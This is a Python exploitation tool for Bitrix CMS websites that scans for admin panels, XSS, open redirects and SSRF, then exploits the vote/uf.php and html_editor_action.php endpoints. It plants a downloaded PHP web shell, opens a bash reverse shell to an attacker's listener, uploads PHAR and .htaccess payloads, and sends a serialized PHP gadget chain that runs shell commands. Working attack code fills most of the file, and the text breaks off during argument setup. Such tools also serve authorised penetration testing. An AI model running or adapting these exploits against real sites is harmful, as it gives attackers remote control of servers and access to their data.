import argparse
import re
import requests
import json
from urllib.parse import urlparse, parse_qs, urlencode
import datetime
import time
import random
import string
import io
import pathlib
import sys


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    DARKCYAN = '\033[36m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

ascii_banner = f"""
.................0xxxxxxxxx@@@x..............
............xx...0xxxxxxxxxxxxxx@@@..........
.......x....xx...0xxxxxxxxxxxxxxxxxx@@.......
.....@@x....xx...0xxxxx..xxxxxxxxxxxxxx@0....
...xxxxx....xx...0xxxxx.......0xxxxxxxxxxx...
..@xxxxx0...xx...0xxxxx@@@@0.....0xxxxxxxx@0.
.xxxxxxx0...xx...0xxxxx.....@@0....xxxxxxxxx.
0xxxxxxx0...x0...0xxxxxx......x@....0xxxxxxxx
xxxxxxxx0...xx...0xxxxxxx@@....xx....xxxxxxxx
xxxxxxxx0...xx...0xxxxxxxxx0...0x....xxxxxxxx
xxxxxxxx0...0x....0xxxxxxxx....xx....xxxxxxxx
0xxxxxxxx....0@......xxx......xx....xxxxxxxxx
.xxxxxxxx@.....x@0..........@@0....xxxxxxxxx.
..xxxxxxxxxx......@@@@@@@@@0.....0@xxxxxxxx0.
...0xxxxxxxx@@x................@@xxxxxxxxx...
.....xxxxxxxxxxx@@@x.....0@@@@xxxxxxxxxx0....
.......xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.......
..........xxxxxxxxxxxxxxxxxxxxxxxxx..........
..............0xxxxxxxxxxxxxxx0..............
..................0xxxxxxx0..................

 ____  _ _        _        ____
| __ )(_) |_ _ __(_)_  __ / ___|  ___ __ _ _ __  _ __   ___ _ __
|  _ \| | __| '__| \ \/ / \___ \ / __/ _` | '_ \| '_ \ / _ \ '__|
| |_) | | |_| |  | |>  <   ___) | (_| (_| | | | | | | |  __/ |
|____/|_|\__|_|  |_/_/\_\ |____/ \___\__,_|_| |_|_| |_|\___|_|


The program scans bitrix vulnerability.
You can also separately check RCE vulnerability (Object injection and Vote).
{bcolors.OKGREEN}Green color means potential vulnerability.{bcolors.ENDC}
{bcolors.WARNING}Yellow color means that request is blocked (403 status code).{bcolors.ENDC}
{bcolors.FAIL}Red color means nothing valuable is found.{bcolors.ENDC}

.............................................\n\n\n
		"""

requests.packages.urllib3.disable_warnings()

admin_url_list = [
	"bitrix/components/bitrix/desktop/admin_settings.php",
	"bitrix/components/bitrix/map.yandex.search/settings/settings.php",
	"bitrix/components/bitrix/player/player_playlist_edit.php",
	"bitrix/tools/autosave.php",
	"bitrix/tools/get_catalog_menu.php",
	"bitrix/tools/upload.php",
	"ololo/?SEF_APPLICATION_CUR_PAGE_URL=/bitrix/admin/"
]

check_error_list = [
	"bitrix/admin/restore_export.php",
	"bitrix/admin/tools_index.php",
	"bitrix/bitrix.php",
	"bitrix/modules/main/ajax_tools.php",
	"bitrix/php_interface/after_connect_d7.php",
	"bitrix/themes/.default/.description.php",
	"bitrix/components/bitrix/main.ui.selector/templates/.default/template.php",
	"bitrix/components/bitrix/forum.user.profile.edit/templates/.default/interface.php"
	]

rce_by_design_list = [
	"bitrix/admin/main_controller.php",
	"bitrix/admin/php_command_line.php"
	]

content_spoofing_pg_list = [
	"bitrix/tools/imagepg.php?img=//interesnyefakty.org/wp-content/uploads/chto-takoe-fishing.jpg",
	"bitrix/templates/learning/js/swfpg.php?img=//evil.host/evil.swf"
	]

open_redirect_list = [
	"bitrix/redirect.php?goto=https://example.com%252F:123@google.com/",
	"bitrix/rk.php?goto=https://site%252F:123@google.com/",
	"bitrix/tools/track_mail_click.php?url=http://site%252F@google.com/"
	]

xss_list = [
	"bitrix/components/bitrix/map.google.view/settings/settings.php?arParams[API_KEY]=123'-'%00'-alert(document.domain)-'",
	"bitrix/components/bitrix/photogallery_user/templates/.default/galleries_recalc.php?AJAX=Y&arParams[PERMISSION]=W&arParams[IBLOCK_ID]=1%00'}};alert(document.domain);if(1){//",
	"bitrix/components/bitrix/mobileapp.list/ajax.php/?=&AJAX_CALL=Y&items%5BITEMS%5D%5BBOTTOM%5D%5BLEFT%5D=&items%5BITEMS%5D%5BTOGGLABLE%5D=test123&=&items%5BITEMS%5D%5BID%5D=%3Cimg+src=%22//%0d%0a)%3B//%22%22%3E%3Cdiv%3Ex%0d%0a%7D)%3Bvar+BX+=+window.BX%3Bwindow.BX+=+function(node,+bCache)%7B%7D%3BBX.ready+=+function(handler)%7B%7D%3Bfunction+__MobileAppList(test)%7Balert(document.location)%3B%7D%3B//%3C/div%3E"
	]

class Formatter(argparse.RawDescriptionHelpFormatter, argparse.ArgumentDefaultsHelpFormatter):
	pass

headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0', 'Bx-ajax': 'true'}

def print_header_scan(name):
	print(f"{bcolors.HEADER}{bcolors.BOLD}------------------------ {name} ------------------------{bcolors.ENDC}\n")

def print_header_rce(name):
	print(f"{bcolors.OKBLUE}{bcolors.BOLD}------------------------ {name} ------------------------{bcolors.ENDC}\n")


def get_composite_data(session, target):
	data = {}
	r = session.get(f'{target}bitrix/tools/composite_data.php', verify=False)
	if r.status_code != 200:
		print(f'{bcolors.FAIL}There is composite data error. Status code {r.status_code}. Check out {target}bitrix/tools/composite_data.php{bcolors.ENDC}')
		return None
	j_r = r.text.replace("'", "\"")
	try:
		d = json.loads(j_r)
	except json.decoder.JSONDecodeError:
		print(f'{bcolors.FAIL}There is error while decoding response. Check out {target}bitrix/tools/composite_data.php{bcolors.ENDC}')
		return None

	data['SERVER_TIME'] = int(d['SERVER_TIME'])
	data['SERVER_TZ_OFFSET'] = int(d['SERVER_TZ_OFFSET'])
	data['USER_TZ_OFFSET'] = int(d['USER_TZ_OFFSET'])
	data['bitrix_sessid'] = d['bitrix_sessid']
	return data

def get_admin_interface(session, target):
	print_header_scan("Bitrix admin interfaces avalable:")

	for url in admin_url_list:
		u = target + url
		r = session.get(u, verify=False)
		if "Авторизация" in r.text and r.status_code == 200:
			print(f"{bcolors.OKGREEN}{u} is available. There is authorisation{bcolors.ENDC}")
		else:
			print(f"{bcolors.FAIL}There is not an admin panel on {u}. Status code: {r.status_code}{bcolors.ENDC}")
	print('\n')
	
def get_register_globals(session, target):
	print_header_scan("Register Globals:")

	r = session.get(f'{target}?USER_FIELD_MANAGER=1', verify=False)
	if r.status_code >= 500:
		print(f"{bcolors.OKGREEN}Error message: \n{r.text}{bcolors.ENDC}")
	else:
		print(f"{bcolors.FAIL}No error. Status code: {r.status_code}{bcolors.ENDC}")
	print('\n')

def get_license_key(session, target):
	print_header_scan("License key:")

	r = session.get(f'{target}bitrix/license_key.php', verify=False)
	if r.status_code == 200 and len(r.text) > 0:
		print(f"{bcolors.OKGREEN}{r.text}{bcolors.ENDC}")
	else:
		print(f"{bcolors.FAIL}License key is not available. Status code: {r.status_code}{bcolors.ENDC}")
	print('\n')

def get_rce_by_design(session, target):
	print_header_scan("RCE by design:")

	for url in rce_by_design_list:
		u = target + url
		r = session.get(u, verify=False)
		if r.status_code == 200 and "Авторизация" in r.text:
			print(f"{bcolors.OKGREEN}{u} have authorisation{bcolors.ENDC}")
		elif r.status_code == 403:
			print(f"{bcolors.WARNING}{u} is forbidden{bcolors.ENDC}")
		else:
			print(f"{bcolors.FAIL}{u} is NOT available. Status code: {r.status_code}{bcolors.ENDC}")
	print('\n')

def get_full_path_disclosure(session, target):
	print_header_scan("Full Path Disclosure")

	for url in check_error_list:
		u = target + url
		r = session.get(u, verify=False)
		if not (400 <= r.status_code < 500) and (re.search(r'failed|warning|error', r.text, flags=re.I|re.M) or (r.status_code >= 500 and len(r.text) > 0)):
			print(f"{bcolors.OKGREEN}Error in {u}{bcolors.ENDC}")
	print('\n')

def get_content_spoofing1(session, target):
	print_header_scan("Content Spoofing (mobileapp.list):")

	url = f"{target}bitrix/components/bitrix/mobileapp.list/ajax.php?items[1][TITLE]=TEXT+INJECTION!+PLEASE+CLICK+HERE!&items[1][DETAIL_LINK]=http://google.com"
	o = urlparse(url)
	query = parse_qs(o.query)
	url = o._replace(query=None).geturl()
	r = session.get(url, params=query, verify=False)
	if r.status_code == 200 and "MAPP_ML_MOBILEAPP_NOT_INSTALLED" in r.text:
		print(f"{bcolors.FAIL}{url} is NOT exploitable{bcolors.ENDC}")
	elif r.status_code == 403:
		print(f"{bcolors.WARNING}{url} is forbidden{bcolors.ENDC}")
	elif r.status_code == 200 and "TEXT INJECTION! PLEASE CLICK HERE!" in r.text:
		print(f"{bcolors.OKGREEN}{url} has content spoofing{bcolors.ENDC}")
	else:
		print(f"{bcolors.FAIL}{url} is NOT available. Status code: {r.status_code}{bcolors.ENDC}")
	print('\n')

def get_content_spoofing2(session, target):
	print_header_scan("Content Spoofing (pg.php):")

	for url in content_spoofing_pg_list:
		url = target + 	url
		o = urlparse(url)
		query = parse_qs(o.query)
		url = o._replace(query=None).geturl()
		r = session.get(url, params=query, verify=False)
		if r.status_code == 200 and re.search(r'//interesnyefakty.org/wp-content/uploads/chto-takoe-fishing.jpg|//evil.host/evil.swf', r.text, flags=re.I|re.M):
			print(f"{bcolors.OKGREEN}{url} has content spoofing{bcolors.ENDC}")
		elif r.status_code == 403:
			print(f"{bcolors.WARNING}{url} is forbidden{bcolors.ENDC}")
		else:
			print(f"{bcolors.FAIL}{url} is NOT available. Status code: {r.status_code}{bcolors.ENDC}")
	print('\n')

def do_open_redirect(session, target):
	print_header_scan("Open Redirect ( LocalRedirect ):")

	for url in open_redirect_list:
		url = target + 	url
		o = urlparse(url)
		query = parse_qs(o.query)
		url = o._replace(query=None).geturl()
		r = session.get(url, params=query, allow_redirects=False, verify=False)
		if r.status_code == 302:
			print(f"{bcolors.OKGREEN}{url} has redirecting{bcolors.ENDC}")
		elif r.status_code == 403:
			print(f"{bcolors.WARNING}{url} is forbidden{bcolors.ENDC}")
		else:
			print(f"{bcolors.FAIL}{url} is NOT available. Status code: {r.status_code}{bcolors.ENDC}")
	print('\n')

def do_xss(session, target):
	print_header_scan("Reflected XSS ( map.google.view and photogallery_user ):")

	for url in xss_list:
		url = target + 	url
		o = urlparse(url)
		query = parse_qs(o.query)
		url = o._replace(query=None).geturl()
		r = session.get(url, params=query, verify=False)
		if r.status_code == 200 and re.search(r'alert\(document.domain\)', r.text, flags=re.I|re.M):
			print(f"{bcolors.OKGREEN}{url} return XSS payload{bcolors.ENDC}")
		elif r.status_code == 403:
			print(f"{bcolors.WARNING}{url} is forbidden{bcolors.ENDC}")
		else:
			print(f"{bcolors.FAIL}{url} is NOT available. Status code: {r.status_code}{bcolors.ENDC}")
	print('\n')

def do_ssrf_attack1(session, target, ssrf_url, bitrix_sessid):
	print_header_scan("Server-Side Request Forgery ( main.urlpreview ):")

	url = f"{target}bitrix/components/bitrix/main.urlpreview/ajax.php"
	data = {'sessid': bitrix_sessid, 'userFieldId':1, 'action': 'attachUrlPreview','url': ssrf_url + "main.urlpreview"}
	r = session.post(url, data=data, verify=False)
	if r.status_code == 200:
		print(f"{bcolors.OKGREEN}Request was sent{bcolors.ENDC}")
	elif r.status_code == 403:
		print(f"{bcolors.WARNING}{url} is forbidden{bcolors.ENDC}")
	else:
		print(f"{bcolors.FAIL}{url} is NOT available. Status code: {r.status_code}{bcolors.ENDC}")
	print('\n')

def do_ssrf_attack2(session, target, ssrf_url, bitrix_sessid):
	print_header_scan("Server-Side Request Forgery ( html_editor_action.php ):")

	url = f"{target}bitrix/tools/html_editor_action.php"
	data = {'sessid': bitrix_sessid, 'action':'video_oembed', 'video_source': ssrf_url + "html_editor_action"}
	r = session.post(url, data=data, verify=False)
	if r.status_code == 200:
		print(f"{bcolors.OKGREEN}Request was sent{bcolors.ENDC}")
	elif r.status_code == 403:
		print(f"{bcolors.WARNING}{url} is forbidden{bcolors.ENDC}")
	else:
		print(f"{bcolors.FAIL}{url} is NOT available. Status code: {r.status_code}{bcolors.ENDC}")
	print('\n')

def do_ssrf_attack3(session, target, ssrf_url, bitrix_sessid):
	print_header_scan("Server-Side Request Forgery ( ajax services ):")

	url = f"{target}bitrix/services/main/ajax.php?action=attachUrlPreview&show_actions=y&buildd_preview=y&die_step=3&admin_section=Y&show_cache_stat1=Y&clear_cache=Y&c=bitrix:main.urlpreview&mode=ajax&=&sessid={bitrix_sessid}&signedParamsString=1.12&listSubscribeId[]=1&itemId=1&deleteSubscribe=Y&userFieldId=0&elementId=1"
	o = urlparse(url)
	query = parse_qs(o.query)
	url = o._replace(query=None).geturl()
	data = {'url': ssrf_url + "index.php?id=1"}
	r = session.post(url, params=query, data=data, verify=False)
	if r.status_code == 200:
		print(f"{bcolors.OKGREEN}Request was sent{bcolors.ENDC}")
	elif r.status_code == 403:
		print(f"{bcolors.WARNING}{url} is forbidden{bcolors.ENDC}")
	else:
		print(f"{bcolors.FAIL}{url} is NOT available. Status code: {r.status_code}{bcolors.ENDC}")
	print('\n')

def scan(session, target_url, ssrf_url):
	bitrix_data = get_composite_data(session, target_url)
	get_admin_interface(session, target_url)
	get_register_globals(session, target_url)
	get_license_key(session, target_url)
	get_rce_by_design(session, target_url)
	get_full_path_disclosure(session, target_url)
	get_content_spoofing1(session, target_url)
	get_content_spoofing2(session, target_url)
	do_open_redirect(session, target_url)
	do_xss(session, target_url)
	if bitrix_data:
		do_ssrf_attack1(session, target_url, ssrf_url, bitrix_data['bitrix_sessid'])
		do_ssrf_attack2(session, target_url, ssrf_url, bitrix_data['bitrix_sessid'])
		do_ssrf_attack3(session, target_url, ssrf_url, bitrix_data['bitrix_sessid'])



def get_random_string(length):
    # With combination of lower and upper case
    result_str = ''.join(random.choice(string.ascii_letters) for i in range(length))
    # print random string
    return result_str

def check_uploaded_file(session, uploaded_file, rand_name, webshell):
	r = session.get(uploaded_file, verify=False)
	if r.status_code == 200:
		if webshell:
			if "Web Shell" in r.text:
				return True
		else:
			if rand_name in r.text:
				return True

	return False


def reverse_shell_payload(session, target, params, lhost, lport, agent_id):

	target += "/"

	endpoint = "bitrix/tools/vote/uf.php"

	bitrix_data = get_composite_data(session, target)
	if not bitrix_data:
		return
	bitrix_sessid = bitrix_data['bitrix_sessid']
	if bitrix_sessid:
		for i in range(2):
			if i == 0:
				files = (
					(f'bxu_files[{agent_id}][NAME]', (None, f'system(\'/bin/bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"\');')),
					#(f'bxu_files[{agent_id}][NAME]', (None, f"""system('php -r \\\'$s=fsockopen("{lhost}",{lport});shell_exec("/bin/sh -i <&3 >&3 2>&3");\\\'');""")),
					#field name 					filename 	file object content-type
					(f'bxu_files[{agent_id}][NAME]', ('image.jpg', '123', 'image/jpeg')),
					('bxu_info[packageIndex]', (None, 'pIndex101')),
					('bxu_info[mode]', (None, 'upload')),
					('sessid', (None, bitrix_sessid)),
					('bxu_info[filesCount]', (None, '1')),
					)
			if i == 1:
				date_unix = bitrix_data['SERVER_TIME'] + bitrix_data['SERVER_TZ_OFFSET'] + 20
				date_next_exec = datetime.datetime.fromtimestamp(date_unix, datetime.timezone(datetime.timedelta(0), 'GMT')).strftime('%d.%m.%Y %H:%M:%S')
				# Body for the second request to change agent time
				files = (
						(f'bxu_files[{agent_id}][NEXT_EXEC]', (None, date_next_exec)),
						#field name 					filename 	file object content-type
						(f'bxu_files[{agent_id}][NAME]', ('image.jpg', '123', 'image/jpeg')),
						('bxu_info[packageIndex]', (None, 'pIndex101')),
						('bxu_info[mode]', (None, 'upload')),
						('sessid', (None, bitrix_sessid)),
						('bxu_info[filesCount]', (None, '1')),
						)

			url = f"{target}{endpoint}"
			r = session.post(url, params=params, files=files, verify=False)

			if r.status_code != 200:
				return False
		return True


def do_rce_vote(session, target_url, agent_id, webshell, path_to_file, lhost='', lport=''):
	print_header_rce("Arbitrary Object Instantiation ( vote/uf.php )")
	bitrix_data = get_composite_data(session, target_url)
	if not bitrix_data:
		return
	bitrix_sessid = bitrix_data['bitrix_sessid']


	target_url = target_url[:-1]

	endpoint = "/bitrix/tools/vote/uf.php"
	#end1 = "attachId[ENTITY_TYPE]=CFileUploader&attachId[ENTITY_ID][events][onFileIsStarted][]=CAllAgent&attachId[ENTITY_ID][events][onFileIsStarted][]=Update&attachId[MODULE_ID]=vote&action=vote"

	query = [
		("attachId[ENTITY_TYPE]", "CFileUploader"),
		("attachId[ENTITY_ID][events][onFileIsStarted][]", "CAllAgent"),
		("attachId[ENTITY_ID][events][onFileIsStarted][]", "Update"),
		("attachId[MODULE_ID]", "vote"),
		("action", "vote"),
	]

	#print(f"[test!!!] agent id: {agent_id}")
	if agent_id == 1:
		agent_id = "f"
	if agent_id == 2:
		agent_id = "1"
	if agent_id == 3:
		agent_id = "343"
	if agent_id == 4:
		agent_id = "r"
	if agent_id == 5:
		agent_id = "zxc"
	if agent_id == 6:
		agent_id = "m"
	if agent_id == 7:
		agent_id = "u"
	if agent_id == 8:
		agent_id = "dfgdfg"
	if agent_id == 9:
		agent_id = "x"

	success = False

	url = f"{target_url}{endpoint}"

	query2 = urlencode(query, safe='[]')

	#print(f"[test!!!] url: {url}")

	if path_to_file:
		# append slash at start
		if path_to_file[0] != "/":
			path_to_file = "/" + path_to_file

		# append slash at end
		if path_to_file[-1] != "/":
			path_to_file += "/"
	else:
		path_to_file = "/"


	#Generate random name for uploading file.
	rand_name = get_random_string(12)
	uploaded_file = f"{target_url}{path_to_file}{rand_name}.txt"
	#print(f"[test!!!] uploaded file: {uploaded_file}")
	count = 0
	#Loop for sending two requests.
	for i in range(2):
		if i == 0:
			if webshell == True:
				# Request Body to add agent that will download the web reverse shell
				uploaded_file = f"{target_url}{path_to_file}{rand_name}.php"
				#print(f"[test!!!] uploaded file in loop: {uploaded_file}")
				#print(f"[test!!!] rand_name in loop: {rand_name}")
				files = (
					(f'bxu_files[{agent_id}][NAME]', (None, f'file_put_contents($_SERVER[\'DOCUMENT_ROOT\']."{path_to_file}{rand_name}.php", fopen("https://raw.githubusercontent.com/artyuum/simple-php-web-shell/master/index.php", "r"));')),
					(f'bxu_files[{agent_id}][NAME]', ('image.jpg', '123', 'image/jpeg')),
					('bxu_info[packageIndex]', (None, 'pIndex101')),
					('bxu_info[mode]', (None, 'upload')),
					('sessid', (None, bitrix_sessid)),
					('bxu_info[filesCount]', (None, '1')),
					)
			else:
				# Request Body to add agent that will create dummy file to check if target is vulnerable
				files = (
					(f'bxu_files[{agent_id}][NAME]', (None, f'file_put_contents($_SERVER[\'DOCUMENT_ROOT\']."{path_to_file}{rand_name}.txt", "{rand_name}' + r'\n");')),
					(f'bxu_files[{agent_id}][NAME]', ('image.jpg', '123', 'image/jpeg')),
					('bxu_info[packageIndex]', (None, 'pIndex101')),
					('bxu_info[mode]', (None, 'upload')),
					('sessid', (None, bitrix_sessid)),
					('bxu_info[filesCount]', (None, '1')),
					)
		if i == 1:
			date_unix = bitrix_data['SERVER_TIME'] + bitrix_data['SERVER_TZ_OFFSET'] + 20
			date_next_exec = datetime.datetime.fromtimestamp(date_unix, datetime.timezone(datetime.timedelta(0), 'GMT')).strftime('%d.%m.%Y %H:%M:%S')
			# Body for the second request to change agent time
			files = {
					f'bxu_files[{agent_id}][NEXT_EXEC]': (None, date_next_exec),
					#field name 					filename 	file object content-type
					f'bxu_files[{agent_id}][NAME]': ('image.jpg', '123', 'image/jpeg'),
					'bxu_info[packageIndex]': (None, 'pIndex101'),
					'bxu_info[mode]': (None, 'upload'),
					'sessid': (None, bitrix_sessid),
					'bxu_info[filesCount]': (None, '1')
					}

		r = session.post(url, params=query2, files=files, verify=False)
		#print(f"[test!!!] request header {i}: {r.request.headers}")
		#print(f"[test!!!] request body {i}: {r.request.body}")

		if r.status_code == 200:
			if not len(r.text):
				print(f"{bcolors.FAIL}Vote agent module is not vulnerable.{bcolors.ENDC}")
				return
			else:
				if "Connector class should be instance of Bitrix\\\\Vote\\\\Attachment\\\\Connector" in r.text:
					print(f"{bcolors.FAIL}Vote agent module is not vulnerable.{bcolors.ENDC}")
					return
				if "The copy name is not in the list" in r.text:
					count += 1
		elif r.status_code == 404:
			print(f"{bcolors.FAIL}Vote agent module is not vulnerable.{bcolors.ENDC}")
			return

	print(f"{bcolors.OKGREEN}Vote agent might be vulnerable! Waiting 60 sec for agent activation...{bcolors.ENDC}")
	if count == 2:
		print(f"{bcolors.OKGREEN}If attack will not work check out another path. Add argument --path{bcolors.ENDC}")
	time.sleep(60)

	#print(f"[test!!!] uploaded file after uploading: {uploaded_file}")
	success = check_uploaded_file(session, uploaded_file, rand_name, webshell)

	if success and webshell:
		print(f"{bcolors.OKGREEN}The target's vote module is vulnerable! Web shell is uploaded, check {uploaded_file}{bcolors.ENDC}")
		return
	elif success and not webshell:
		print(f"{bcolors.OKGREEN}The target's vote module is vulnerable! Preparing reverse shell connection.{bcolors.ENDC}")
		time.sleep(10)

		err = reverse_shell_payload(session, target_url, query2, lhost, lport, agent_id)

		time.sleep(15)
		if not err:
			print(f"{bcolors.FAIL}Unable to establish reverse shell connection{bcolors.ENDC}")

	else:
		for counter in range(3):
			print(f"{bcolors.FAIL}Failed, trying one more time... {counter + 1}{bcolors.ENDC}")
			time.sleep(3)
			success = check_uploaded_file(session, uploaded_file, rand_name, webshell)
			if success and webshell:
				print(f"{bcolors.OKGREEN}The target's vote module is vulnerable! Web shell is uploaded, check {uploaded_file}{bcolors.ENDC}")
				return
			if success and not webshell:
				print(f"{bcolors.OKGREEN}The target's vote module is vulnerable! Preparing reverse shell connection.{bcolors.ENDC}")
				time.sleep(10)

				err = reverse_shell_payload(session, target_url, query2, lhost, lport, agent_id)

				time.sleep(15)
				if not err:
					print(f"{bcolors.FAIL}Unable to establish reverse shell connection{bcolors.ENDC}")
				return
		print(f"{bcolors.FAIL}The target's vote agent might be dead, try another vote agent's ID!{bcolors.ENDC}")


def make_file(name, content):
    f = io.BytesIO(content)
    f.name = name
    return f

def upload_files(session, url, sessid, payloads):
	cid = "CID" + str(random.randint(1000000000000, 9999999999999))
	pindex = "pIndex" + str(random.randint(1000000000000, 9999999999999))

	files = {
		"bxu_info[CID]": (None, cid),
		"bxu_info[packageIndex]": (None, pindex),
		"bxu_info[filesCount]": (None, str(len(payloads))),
		"bxu_info[mode]": (None, "upload"),
	}

	params = {
		"attachId[MODULE_ID]": "iblock",
		"attachId[ENTITY_TYPE]": "CFileUploader",
		"action": "vote",
		"sessid": sessid,
	}

	for i, f in enumerate(payloads):
		files[f"bxu_files[{i}][name]"] = (None, "1")
		files[f"bxu_files[{i}][{f.name}]"] = f
		params[f"attachId[ENTITY_ID][copies][{f.name}]"] = "1"

	r = session.post(
		f"{url}bitrix/tools/vote/uf.php",
		params=params,
		files=files,
		verify=False,
	)

	paths = {}

	try:
		data = r.json()
		for fname, info in data["files"][0]["file"]["files"].items():
			if fname == "default":
				continue
			paths[fname] = info["tmp_name"]
	except Exception:
		if not len(r.text):
			raise Exception(f"{bcolors.FAIL}Fail to upload files, bad response. Empty body response. Status code: {r.status_code}{bcolors.ENDC}")
		raise Exception(f"{bcolors.FAIL}Fail to upload files, bad response. Status code: {r.status_code}{bcolors.ENDC}")

	return paths

def do_rce_vote_phar(session, url, payload, payload_name):
	print_header_rce("RCE using PHAR deserialization ( vote/uf.php )")
	bitrix_data = get_composite_data(session, url)
	if not bitrix_data:
		return
	sessid = bitrix_data['bitrix_sessid']

	print(f"{bcolors.OKGREEN}Uploading PHAR {bcolors.ENDC}")
	paths = upload_files(session,
		url,
		sessid,
		[
			make_file(payload_name, payload.read())
		]
	)

	path = paths[payload_name]

	params = {
		"attachId[MODULE_ID]": "iblock",
		"attachId[ENTITY_TYPE]": "Phar",
		"attachId[ENTITY_ID]": path,
		"action": "vote",
		"sessid": sessid,
	}

	print(f"{bcolors.OKGREEN}Access uploaded PHAR to trigger unserialize. Checking a deserialization...{bcolors.ENDC}")
	r = session.post(
		f"{url}bitrix/tools/vote/uf.php",
		params=params,
		verify=False,
	)

	if r.status_code == 200:
		if len(r.text):
			if ("Connector class should be instance of Connector" in r.text) or ("Connector class should be instance of Bitrix\\\\Vote\\\\Attachment\\\\Connector" in r.text):
				print(f"{bcolors.FAIL}Vote agent module for phar deserialization is not vulnerable.{bcolors.ENDC}")
				return
			elif 'Error' in r.text:
				print(f"{bcolors.FAIL}There is error. Status code: {r.status_code}. Response text: {r.text}{bcolors.ENDC}")
				return
			else:
				print(f"Vulnerable: {r.text}")
		else:
			print(f"Not vulnerable")
	else:
		print(f"{bcolors.FAIL}There is error. Status code: {r.status_code}. Response text: {r.text}{bcolors.ENDC}")


def do_rce_vote_upload_htaccess(session, url, payload, payload_name):
	print_header_rce("RCE using .htaccess and shell upload ( vote/uf.php )")
	bitrix_data = get_composite_data(session, url)
	if not bitrix_data:
		return
	sessid = bitrix_data['bitrix_sessid']

	ext = pathlib.Path(payload_name).suffix

	paths = upload_files(session,
		url,
		sessid,
		[
			make_file(payload_name, payload.read()),
			make_file(
				"../.htaccess", f"AddHandler application/x-httpd-php {ext}\n".encode()
			),
		],
	)
	try:
		parts = paths[payload_name].split("/")
		shell_path = "/".join(parts[parts.index("upload"):])
		print(f"{bcolors.OKGREEN}Success! Shell path {url}{shell_path}")
	except Exception as e:
		print(f"{bcolors.FAIL}Error: {str(e)}{bcolors.ENDC}")

def convert_str_for_payload(str):
	byte_array = bytes(str, "utf-8")
	return ''.join(f'\\{byte:02x}' for byte in byte_array)

def get_payload_for_object(func, command):
	return r'O:27:"Bitrix\Main\ORM\Data\Result":3:{S:12:"\00*\00isSuccess";b:0;S:20:"\00*\00wereErrorsChecked";b:0;S:9:"\00*\00errors";O:27:"Bitrix\Main\Type\Dictionary":1:{S:9:"\00*\00values";a:1:{i:0;O:17:"Bitrix\Main\Error":1:{S:10:"\00*\00message";O:36:"Bitrix\Main\UI\Viewer\ItemAttributes":1:{S:13:"\00*\00attributes";O:29:"Bitrix\Main\DB\ResultIterator":3:{S:38:"\00Bitrix\5CMain\5CDB\5CResultIterator\00counter";i:0;S:42:"\00Bitrix\5CMain\5CDB\5CResultIterator\00currentData";i:0;S:37:"\00Bitrix\5CMain\5CDB\5CResultIterator\00result";O:26:"Bitrix\Main\DB\ArrayResult":2:{S:11:"\00*\00resource";a:1:{i:0;a:2:{i:0;S:' + str(len(command)) + r':"' + convert_str_for_payload(command) + r'";i:1;s:1:"x";}}S:13:"\00*\00converters";a:2:{i:0;S:' + str(len(func)) + r':"' + convert_str_for_payload(func) + r'";i:1;s:17:"WriteFinalMessage";}}}}}}}}'

def do_object_injection(session, target_url, function, command):
	print_header_rce("RCE via PHP Object Injection ( html_editor_action.php )")
	bitrix_data = get_composite_data(session, target_url)
	if not bitrix_data:
		return
	bitrix_sessid = bitrix_data['bitrix_sessid']

	url = f"{target_url}bitrix/tools/html_editor_action.php"
	files = {
		'bxu_files[.][files][code]': (None, 'default'),
		#field name 				filename 		file object 						 content-type
		'bxu_files[.][default]': ('image.jpg', get_payload_for_object(function, command), 'image/jpeg'),
		'bxu_info[CID]': (None, '1'),
		'bxu_info[packageIndex]': (None, 'pIndex101'),
		'bxu_info[mode]': (None, 'upload'),
		'action': (None, 'uploadfile'),
		'sessid': (None, bitrix_sessid),
		'bxu_info[filesCount]': (None, '1')
		}

	r = session.post(url, files=files, verify=False)
	if r.status_code != 403 and r.status_code != 404:
		# print(f'Response status code:\n\n{r.status_code}\n\n')
		# print(f'Response body:\n\n{r.text}\n\n')
		headers['Content-Type'] = 'application/x-www-form-urlencoded'
		data = f"bxu_info[packageIndex]=pIndex101&action=uploadfile&bxu_info[mode]=upload&sessid={bitrix_sessid}&bxu_info[filesCount]=1&bxu_info[CID]=default%00"
		r = session.post(url, data=data, headers=headers, verify=False)
		print(f'{bcolors.OKGREEN}Response status code: {r.status_code}{bcolors.ENDC}\n')
		if r.text:
			print(f'{bcolors.OKGREEN}Response body:{bcolors.ENDC}\n\n{r.text}\n\n')
		else:
			print(f'{bcolors.FAIL}Response body is empty{bcolors.ENDC}\n\n')
	else:
		print(f'{bcolors.FAIL}Page bitrix/tools/html_editor_action.php is not available. Status code: {r.status_code}{bcolors.ENDC}')


def main():
	parser = argparse.ArgumentParser(
	prog = 'Bitrix scanner',
	description = """
	The program scans bitrix vulnerability.
	Green color means potential vulnerability.
	Yellow color means that request is blocked (403 status code).
	Red color means nothing valuable is found.

	There is several modes:
	1) Scan mode;
	2) RCE vote;
	3) RCE vote phar unserialize mode (Exploit Nginx or Apache setup using PHAR deserialization);
	4) RCE vote using .htaccess (Exploit Apache setup using .htaccess and shell upload);
	5) RCE "html_editor_action" (object injection).

	""",
	epilog = """
	Example of usage:

	Scan:
		python3 test_bitrix.py -t https://example.com scan -s http://subdomain.oastify.com

	RCE "html_editor_action":
		python3 test_bitrix.py -t https://example.com object_injection -c 'ls | base64'

	RCE vote phar deserialization (payload must be .phar):
		php -d phar.readonly=0 gadgets.php rce1 system '<os command here>' payload.phar
		python3 test_bitrix.py -t https://example.com vote_phar -p payload.phar

	RCE vote:
		webshell: python3 test_bitrix.py -t https://example.com rce_vote --web-shell true
		OR
		reverse shell: python3 test_bitrix.py -t https://example.com rce_vote --lhost 52.52.88.11 --lport 8001

	RCE vote using .htaccess (payload must not be .php):
		python3 test_bitrix.py -t https://example.com vote_htaccess -p shell.html

	""",
	formatter_class=Formatter
	)

	# Common ------------------------------------------------------------------------------
	parser.add_argument("-t", '--target', help='target url (example: https://target.com)', required=True)
	parser.add_argument("-x", '--proxy', metavar="proxy", help='URL proxy (example: http://127.0.0.1:8080)')
	subparser = parser.add_subparsers(dest='subcommand')
	subparser.required = True

